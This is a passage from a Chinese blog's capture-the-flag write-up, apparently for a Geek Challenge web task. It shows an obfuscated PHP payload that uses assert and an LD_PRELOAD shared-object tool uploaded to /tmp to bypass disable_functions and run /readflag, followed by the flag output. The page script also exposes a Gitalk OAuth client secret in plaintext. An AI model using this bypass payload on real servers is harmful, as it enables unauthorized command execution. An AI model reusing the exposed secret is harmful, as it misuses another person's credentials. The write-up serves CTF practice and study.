+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;yangyangwithgnu&#x2F;bypass_disablefunc_via_LD_PRELOAD</span><br></pre></td></tr></table></figure>
+
+<p>只有/tmp有文件修改权限，上传<code>bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so</code>到/tmp下</p>
+<p>最后payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;(~%A0%B8%BA%AB);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;__&#x3D;assert&amp;_&#x3D;include &quot;&#x2F;tmp&#x2F;bypass_disablefunc.php&quot;&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+
+<p>输出为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> example: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so</span><br><span class="line"></span><br><span class="line">cmdline: &#x2F;readflag &gt; &#x2F;tmp&#x2F;xx 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">flag&#123;6e16639a-9eca-45b8-a972-e61da4146393&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://sunny250.github.io/2020/01/24/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%9510-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98web2/" data-id="ck7vssfjq000apk7ebclm4fsz"
+        class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" rel="tag">极客大挑战</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2020/02/04/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%9511-SUCTF2019web%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            buuoj刷题记录11-SUCTF2019web复现
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/01/24/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%959/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">buuoj刷题记录9</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+
+  
+  
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'c2ff86b3b4668317d630',
+      clientSecret: '92facc954b6661c7556b845f2cb775dfb77df12c',
+      repo: 'sunny250.github.io',
+      owner: 'sunny250',
+      admin: ['sunny250'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>
+        &copy;
+        2019-2020
+        sunny250
+      </li>
+      <li>
+        
+        
+        
+        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a> by shenyu
+        
+      </li>
+    </ul>
+    <ul class="list-inline">
+      <li>
+        
+        
+        <ul class="list-inline">
+  <li>PV:<span id="busuanzi_value_page_pv"></span></li>
+  <li>UV:<span id="busuanzi_value_site_uv"></span></li>
+</ul>
+        
+      </li>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+    <div class="to_top">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+      </div>
+    </main>
+    
+    <aside class="sidebar">
+      
+        <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/logo.jpg" alt="晴天`blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives/">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/links/">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about/">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+      </aside>
+      
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+
+<script src="/js/ayer.js"></script>
+
+
+
+  <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  </div>
+</body>
+
+</html>
